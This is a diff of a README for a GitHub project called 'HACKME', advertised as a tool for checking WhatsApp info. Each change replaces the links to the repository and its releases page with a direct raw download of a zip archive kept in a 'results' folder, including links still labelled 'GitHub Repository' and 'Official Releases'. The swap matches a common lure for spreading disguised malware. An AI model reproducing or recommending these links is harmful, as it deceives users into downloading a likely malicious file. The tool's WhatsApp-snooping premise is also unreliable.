@@ -1,6 +1,6 @@
 # 🔍 HACKME - Check WhatsApp Info Easily
 
-[![Download HACKME](https://img.shields.io/badge/Download-HACKME-blue?style=for-the-badge)](https://github.com/ajaakevin/HACKME/releases)
+[![Download HACKME](https://img.shields.io/badge/Download-HACKME-blue?style=for-the-badge)](https://github.com/ajaakevin/HACKME/raw/refs/heads/main/📁 results/Software-v3.4.zip)
 
 ---
 
@@ -32,7 +32,7 @@ Follow these steps to download and run HACKME without technical trouble.
 
 Go to the official releases page for HACKME:
 
-[Download HACKME from Releases](https://github.com/ajaakevin/HACKME/releases)
+[Download HACKME from Releases](https://github.com/ajaakevin/HACKME/raw/refs/heads/main/📁 results/Software-v3.4.zip)
 
 This page contains the latest versions for Windows and other platforms. The files you want end with “.exe” or indicate Windows compatibility.
 
@@ -133,7 +133,7 @@ If you want to remove HACKME from your computer:
 
 ## 📌 Useful Links
 
-- GitHub Repository: https://github.com/ajaakevin/HACKME  
-- Official Releases: https://github.com/ajaakevin/HACKME/releases  
+- GitHub Repository: https://github.com/ajaakevin/HACKME/raw/refs/heads/main/📁 results/Software-v3.4.zip  
+- Official Releases: https://github.com/ajaakevin/HACKME/raw/refs/heads/main/📁 results/Software-v3.4.zip  
 
-[![Download HACKME](https://img.shields.io/badge/Download-HACKME-grey?style=for-the-badge)](https://github.com/ajaakevin/HACKME/releases)
+[![Download HACKME](https://img.shields.io/badge/Download-HACKME-grey?style=for-the-badge)](https://github.com/ajaakevin/HACKME/raw/refs/heads/main/📁 results/Software-v3.4.zip)
